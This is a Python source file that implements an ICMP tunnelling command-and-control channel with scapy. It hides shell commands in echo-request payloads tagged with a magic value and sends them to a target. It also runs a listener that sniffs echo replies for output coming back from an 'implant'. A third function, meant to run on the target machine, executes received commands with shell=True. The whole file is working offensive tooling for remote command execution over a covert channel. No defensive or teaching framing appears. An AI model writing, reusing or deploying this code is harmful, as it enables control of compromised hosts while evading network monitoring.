import logging
import subprocess
from scapy.all import IP, ICMP, Raw, send, sniff

# Use a unique but simple magic value to identify our packets
ICMP_MAGIC_VALUE = b'TUNNEL'

def send_icmp_command(target_ip, command):
    """
    Sends a command to a target IP hidden inside an ICMP echo request packet.
    """
    if isinstance(command, str):
        command = command.encode()

    payload = ICMP_MAGIC_VALUE + command
    packet = IP(dst=target_ip) / ICMP() / Raw(load=payload)

    try:
        send(packet, verbose=False)
        logging.info(f"Sent ICMP command to {target_ip}: {command.decode()}")
        return True
    except PermissionError:
        logging.error("Permission denied. This operation requires root privileges.")
        print("Error: Permission denied. You need to run this tool as root to send ICMP packets.")
        return False
    except Exception as e:
        logging.error(f"Failed to send ICMP packet: {e}")
        return False

def icmp_c2_listener(timeout=60):
    """
    Listens for ICMP echo reply packets containing command output.
    """
    logging.info("Starting ICMP C2 listener...")
    print("ICMP C2 listener started. Waiting for implant to connect...")

    def packet_handler(packet):
        if packet.haslayer(ICMP) and packet[ICMP].type == 0 and packet.haslayer(Raw): # ICMP Echo Reply
            payload = packet[Raw].load
            if payload.startswith(ICMP_MAGIC_VALUE):
                output = payload[len(ICMP_MAGIC_VALUE):].decode(errors='ignore')
                print(f"\n--- C2 Output from {packet[IP].src} ---\n{output}\n--- End Output ---")
                return True # Stop sniffing
        return False

    try:
        sniff(filter="icmp", prn=packet_handler, stop_filter=packet_handler, timeout=timeout)
    except PermissionError:
        logging.error("Permission denied. This operation requires root privileges.")
        print("Error: Permission denied. You need to run this tool as root to sniff ICMP packets.")
    except Exception as e:
        logging.error(f"An error occurred in the ICMP listener: {e}")

    logging.info("ICMP C2 listener stopped.")

def execute_implant_command(command):
    """
    Executes a command on the implant and returns the output.
    This is intended to be run on the target machine.
    """
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return str(e)
